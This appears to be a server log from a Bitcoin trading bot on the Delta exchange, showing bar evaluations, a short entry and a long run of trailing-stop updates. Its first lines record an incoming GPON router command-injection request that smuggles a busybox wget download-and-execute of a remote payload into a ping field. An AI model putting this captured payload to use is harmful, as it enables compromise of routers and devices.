+  Invalid method encountered:
+
+    b'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://140.233.190.47/gpon+-O+/tmp/ger;sh+/tmp/ger`&ipv=0'
+      ^
+2026-06-01 11:03:41  INFO      aiohttp.access — 150.228.207.237 [01/Jun/2026:11:03:41 +0530] "UNKNOWN / HTTP/1.0" 400 334 "-" "-"
+2026-06-01 11:22:42  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:11:22:42 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 11:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73443.00 true_low=73292.50 true_close=73308.50
+2026-06-01 11:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780291800000 | new_boundary=1780293600000 | bars=250 — evaluating signals...
+2026-06-01 11:30:01  INFO      main — [BAR] close=73308.50  atr=261.35  adx=16.9  rsi=41.7  trend=False  range=True  filters=FAIL  [atr=False body=False vol=True]
+2026-06-01 11:44:13  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:11:44:13 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 12:00:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73347.00 true_low=73111.00 true_close=73158.00
+2026-06-01 12:00:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780293600000 | new_boundary=1780295400000 | bars=250 — evaluating signals...
+2026-06-01 12:00:01  INFO      main — [BAR] close=73158.00  atr=259.54  adx=17.1  rsi=38.8  trend=False  range=True  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 12:01:39  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:12:01:39 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 12:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73219.00 true_low=72926.50 true_close=73091.50
+2026-06-01 12:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780295400000 | new_boundary=1780297200000 | bars=250 — evaluating signals...
+2026-06-01 12:30:01  INFO      main — [BAR] close=73091.50  atr=261.90  adx=17.7  rsi=37.6  trend=False  range=True  filters=FAIL  [atr=False body=False vol=True]
+2026-06-01 12:34:32  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:12:34:32 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 13:00:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73186.00 true_low=72908.00 true_close=72975.50
+2026-06-01 13:00:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780297200000 | new_boundary=1780299000000 | bars=250 — evaluating signals...
+2026-06-01 13:00:00  INFO      main — [BAR] close=72975.50  atr=263.05  adx=18.5  rsi=35.5  trend=True  range=True  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 13:04:16  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:13:04:16 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 13:11:13  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:13:11:13 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 13:30:02  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=72971.50 true_low=72674.00 true_close=72793.50
+2026-06-01 13:30:02  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780299000000 | new_boundary=1780300800000 | bars=250 — evaluating signals...
+2026-06-01 13:30:02  INFO      main — [BAR] close=72793.50  atr=265.79  adx=19.6  rsi=32.4  trend=True  range=True  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 13:47:42  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:13:47:42 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 14:00:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=72846.00 true_low=72719.00 true_close=72808.00
+2026-06-01 14:00:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780300800000 | new_boundary=1780302600000 | bars=250 — evaluating signals...
+2026-06-01 14:00:00  INFO      main — [BAR] close=72808.00  atr=255.88  adx=20.8  rsi=32.9  trend=True  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-06-01 14:11:42  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:14:11:42 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 14:30:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=72907.50 true_low=72592.00 true_close=72903.00
+2026-06-01 14:30:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780302600000 | new_boundary=1780304400000 | bars=250 — evaluating signals...
+2026-06-01 14:30:00  INFO      main — [BAR] close=72903.00  atr=260.14  adx=22.3  rsi=36.2  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-06-01 14:42:43  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:14:42:43 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 15:00:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73083.50 true_low=72882.50 true_close=72983.50
+2026-06-01 15:00:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780304400000 | new_boundary=1780306200000 | bars=250 — evaluating signals...
+2026-06-01 15:00:01  INFO      main — [BAR] close=72983.50  atr=255.91  adx=23.4  rsi=39.0  trend=True  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-06-01 15:13:25  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:15:13:25 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 15:17:07  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:15:17:07 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 15:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73027.50 true_low=72809.50 true_close=72858.00
+2026-06-01 15:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780306200000 | new_boundary=1780308000000 | bars=250 — evaluating signals...
+2026-06-01 15:30:01  INFO      main — [BAR] close=72858.00  atr=253.21  adx=24.4  rsi=36.3  trend=True  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-06-01 15:55:00  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:15:55:00 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 16:00:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=72886.00 true_low=72646.00 true_close=72663.50
+2026-06-01 16:00:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780308000000 | new_boundary=1780309800000 | bars=250 — evaluating signals...
+2026-06-01 16:00:00  INFO      main — [BAR] close=72663.50  atr=252.26  adx=25.5  rsi=32.6  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-06-01 16:00:00  INFO      main — [SIGNAL] Trend Short  is_long=False  regime=TREND
+2026-06-01 16:00:00  INFO      orders.manager — [OM] Placing entry | side=sell  qty=1  sl=72814.86  tp=72058.07
+2026-06-01 16:00:02  INFO      orders.manager — [OM] Entry filled | id=1339864524  fill=72691.00
+2026-06-01 16:00:02  INFO      orders.manager — [OM] ✅ Emergency bracket SL placed on Delta | sl=72814.86  (never amended — Python trail owns exits)
+2026-06-01 16:00:02  INFO      trail_loop — [TRAIL] Started | entry=72691.00 sl=72814.86 tp=72058.07 entry_atr=252.26 is_long=False | trail_pts=17.66 trail_off=50.45
+2026-06-01 16:00:02  INFO      trail_loop — [TRAIL] Signal bar OHLC (informational, not applied to trail) | high=72886.00 low=72646.00 close=72663.50 atr=252.26
+2026-06-01 16:00:02  INFO      main — [ENTRY] Filled | type=Trend Short  fill=72691.00  sl=72814.86  tp=72058.07  atr=252.26  stop_dist=151.36
+2026-06-01 16:00:02  INFO      infra.journal — Open trade recorded | Trend Short  qty=1 lots  entry=72691.00
+2026-06-01 16:00:02  INFO      trail_loop — [TRAIL] Source offset: binance=72705.72 delta=72691.00 offset=+14.72
+2026-06-01 16:00:03  INFO      infra.telegram — Telegram sent: '🔴 <b>ENTRY — SHORT</b>  |  <code>1</code> lot  (0.0010 BTC)\n<code>2026-06-01 16:00:02 IST</code>\n\nFill  : <b>$72,691.00</b>\nSL    : <code>$72,814.86</code>  (-123.86)\nTP    : <code>$72,058.07</code>  (+632.93)\nATR   : <code>252.26</code>  |  R:R <code>5.11</code>'
+2026-06-01 16:00:33  INFO      trail_loop — [TRAIL] Offset recalibrated: +14.72 → +23.19 (binance=72756.00 delta=72732.81)
+2026-06-01 16:01:04  INFO      trail_loop — [TRAIL] Offset recalibrated: +23.19 → +21.03 (binance=72775.19 delta=72754.16)
+2026-06-01 16:01:34  INFO      trail_loop — [TRAIL] Offset recalibrated: +21.03 → +21.90 (binance=72764.00 delta=72742.10)
+2026-06-01 16:02:05  INFO      trail_loop — [TRAIL] Offset recalibrated: +21.90 → +19.76 (binance=72736.00 delta=72716.24)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72814.86 → 72723.77 (stage 0 best=72673.32 src=arm_tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail ARMED | price=72673.32 act_price=72673.34 trail_sl=72723.77 trail_pts=17.66 trail_off=50.45
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72723.77 → 72723.72 (stage 0 best=72673.27 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72723.72 → 72723.69 (stage 0 best=72673.24 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72723.69 → 72723.60 (stage 0 best=72673.15 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72723.60 → 72723.43 (stage 0 best=72672.98 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72723.43 → 72723.39 (stage 0 best=72672.94 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72723.39 → 72723.31 (stage 0 best=72672.86 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72723.31 → 72723.24 (stage 0 best=72672.79 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72723.24 → 72723.23 (stage 0 best=72672.78 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72723.23 → 72723.07 (stage 0 best=72672.62 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72723.07 → 72722.85 (stage 0 best=72672.40 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72722.85 → 72722.70 (stage 0 best=72672.25 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72722.70 → 72722.69 (stage 0 best=72672.24 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72722.69 → 72722.43 (stage 0 best=72671.98 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72722.43 → 72722.16 (stage 0 best=72671.71 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72722.16 → 72722.08 (stage 0 best=72671.63 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72722.08 → 72721.62 (stage 0 best=72671.17 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72721.62 → 72721.49 (stage 0 best=72671.04 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72721.49 → 72721.35 (stage 0 best=72670.90 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72721.35 → 72721.30 (stage 0 best=72670.85 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72721.30 → 72721.18 (stage 0 best=72670.73 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72721.18 → 72721.16 (stage 0 best=72670.71 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72721.16 → 72720.85 (stage 0 best=72670.40 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72720.85 → 72720.69 (stage 0 best=72670.24 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72720.69 → 72720.68 (stage 0 best=72670.23 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72720.68 → 72720.62 (stage 0 best=72670.17 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72720.62 → 72720.54 (stage 0 best=72670.09 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72720.54 → 72720.44 (stage 0 best=72669.99 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72720.44 → 72720.30 (stage 0 best=72669.85 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72720.30 → 72720.26 (stage 0 best=72669.81 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72720.26 → 72720.09 (stage 0 best=72669.64 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72720.09 → 72720.00 (stage 0 best=72669.55 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72720.00 → 72719.67 (stage 0 best=72669.22 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72719.67 → 72719.47 (stage 0 best=72669.02 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72719.47 → 72719.46 (stage 0 best=72669.01 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72719.46 → 72719.35 (stage 0 best=72668.90 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72719.35 → 72718.92 (stage 0 best=72668.47 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72718.92 → 72718.88 (stage 0 best=72668.43 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72718.88 → 72718.76 (stage 0 best=72668.31 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72718.76 → 72718.73 (stage 0 best=72668.28 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72718.73 → 72718.69 (stage 0 best=72668.24 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72718.69 → 72718.55 (stage 0 best=72668.10 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72718.55 → 72718.45 (stage 0 best=72668.00 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72718.45 → 72718.44 (stage 0 best=72667.99 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72718.44 → 72718.37 (stage 0 best=72667.92 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72718.37 → 72717.85 (stage 0 best=72667.40 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72717.85 → 72717.84 (stage 0 best=72667.39 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72717.84 → 72717.71 (stage 0 best=72667.26 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72717.71 → 72717.65 (stage 0 best=72667.20 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72717.65 → 72717.30 (stage 0 best=72666.85 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72717.30 → 72716.86 (stage 0 best=72666.41 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72716.86 → 72716.85 (stage 0 best=72666.40 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72716.85 → 72716.79 (stage 0 best=72666.34 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72716.79 → 72716.69 (stage 0 best=72666.24 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72716.69 → 72716.68 (stage 0 best=72666.23 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72716.68 → 72716.67 (stage 0 best=72666.22 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72716.67 → 72716.48 (stage 0 best=72666.03 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72716.48 → 72716.41 (stage 0 best=72665.96 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72716.41 → 72716.36 (stage 0 best=72665.91 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72716.36 → 72716.31 (stage 0 best=72665.86 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72716.31 → 72716.03 (stage 0 best=72665.58 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72716.03 → 72715.99 (stage 0 best=72665.54 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72715.99 → 72715.98 (stage 0 best=72665.53 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72715.98 → 72715.68 (stage 0 best=72665.23 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72715.68 → 72715.14 (stage 0 best=72664.69 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72715.14 → 72714.69 (stage 0 best=72664.24 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72714.69 → 72714.60 (stage 0 best=72664.15 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72714.60 → 72714.21 (stage 0 best=72663.76 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72714.21 → 72714.16 (stage 0 best=72663.71 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72714.16 → 72713.94 (stage 0 best=72663.49 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72713.94 → 72713.53 (stage 0 best=72663.08 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72713.53 → 72713.46 (stage 0 best=72663.01 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72713.46 → 72713.35 (stage 0 best=72662.90 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72713.35 → 72713.14 (stage 0 best=72662.69 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72713.14 → 72713.03 (stage 0 best=72662.58 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72713.03 → 72712.78 (stage 0 best=72662.33 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72712.78 → 72712.69 (stage 0 best=72662.24 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72712.69 → 72712.62 (stage 0 best=72662.17 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72712.62 → 72712.39 (stage 0 best=72661.94 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72712.39 → 72712.26 (stage 0 best=72661.81 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72712.26 → 72712.16 (stage 0 best=72661.71 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72712.16 → 72711.82 (stage 0 best=72661.37 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72711.82 → 72711.59 (stage 0 best=72661.14 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72711.59 → 72711.46 (stage 0 best=72661.01 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72711.46 → 72711.45 (stage 0 best=72661.00 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72711.45 → 72711.44 (stage 0 best=72660.99 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72711.44 → 72711.34 (stage 0 best=72660.89 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72711.34 → 72710.69 (stage 0 best=72660.24 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72710.69 → 72710.57 (stage 0 best=72660.12 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72710.57 → 72710.55 (stage 0 best=72660.10 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72710.55 → 72710.43 (stage 0 best=72659.98 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72710.43 → 72710.23 (stage 0 best=72659.78 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72710.23 → 72710.01 (stage 0 best=72659.56 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72710.01 → 72710.00 (stage 0 best=72659.55 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72710.00 → 72709.49 (stage 0 best=72659.04 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72709.49 → 72709.41 (stage 0 best=72658.96 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72709.41 → 72709.33 (stage 0 best=72658.88 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72709.33 → 72709.00 (stage 0 best=72658.55 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72709.00 → 72708.93 (stage 0 best=72658.48 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72708.93 → 72708.83 (stage 0 best=72658.38 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72708.83 → 72708.75 (stage 0 best=72658.30 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72708.75 → 72708.69 (stage 0 best=72658.24 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72708.69 → 72708.55 (stage 0 best=72658.10 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72708.55 → 72707.60 (stage 0 best=72657.15 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72707.60 → 72706.93 (stage 0 best=72656.48 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72706.93 → 72706.91 (stage 0 best=72656.46 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72706.91 → 72706.88 (stage 0 best=72656.43 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72706.88 → 72706.69 (stage 0 best=72656.24 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72706.69 → 72706.68 (stage 0 best=72656.23 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72706.68 → 72706.63 (stage 0 best=72656.18 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72706.63 → 72706.53 (stage 0 best=72656.08 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72706.53 → 72705.86 (stage 0 best=72655.41 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72705.86 → 72705.84 (stage 0 best=72655.39 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72705.84 → 72705.78 (stage 0 best=72655.33 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72705.78 → 72705.63 (stage 0 best=72655.18 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72705.63 → 72705.37 (stage 0 best=72654.92 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72705.37 → 72705.24 (stage 0 best=72654.79 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72705.24 → 72704.69 (stage 0 best=72654.24 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72704.69 → 72704.39 (stage 0 best=72653.94 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72704.39 → 72704.06 (stage 0 best=72653.61 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72704.06 → 72704.00 (stage 0 best=72653.55 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72704.00 → 72703.95 (stage 0 best=72653.50 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72703.95 → 72703.29 (stage 0 best=72652.84 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72703.29 → 72703.24 (stage 0 best=72652.79 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72703.24 → 72703.15 (stage 0 best=72652.70 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72703.15 → 72702.73 (stage 0 best=72652.28 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72702.73 → 72702.70 (stage 0 best=72652.25 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72702.70 → 72702.69 (stage 0 best=72652.24 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72702.69 → 72702.38 (stage 0 best=72651.93 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72702.38 → 72702.37 (stage 0 best=72651.92 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72702.37 → 72702.19 (stage 0 best=72651.74 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72702.19 → 72702.12 (stage 0 best=72651.67 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72702.12 → 72702.09 (stage 0 best=72651.64 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72702.09 → 72701.59 (stage 0 best=72651.14 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72701.59 → 72701.55 (stage 0 best=72651.10 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72701.55 → 72701.47 (stage 0 best=72651.02 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72701.47 → 72701.26 (stage 0 best=72650.81 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72701.26 → 72701.18 (stage 0 best=72650.73 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72701.18 → 72701.11 (stage 0 best=72650.66 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72701.11 → 72700.81 (stage 0 best=72650.36 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72700.81 → 72700.74 (stage 0 best=72650.29 src=tick)
+2026-06-01 16:02:29  INFO      trail_loop — [TRAIL] Trail SL: 72700.74 → 72700.69 (stage 0 best=72650.24 src=tick)
+2026-06-01 16:02:30  INFO      trail_loop — [TRAIL] Trail SL: 72700.69 → 72700.68 (stage 0 best=72650.23 src=tick)
+2026-06-01 16:02:30  INFO      trail_loop — [TRAIL] Trail SL: 72700.68 → 72700.58 (stage 0 best=72650.13 src=tick)
+2026-06-01 16:02:30  INFO      trail_loop — [TRAIL] Trail SL: 72700.58 → 72700.49 (stage 0 best=72650.04 src=tick)
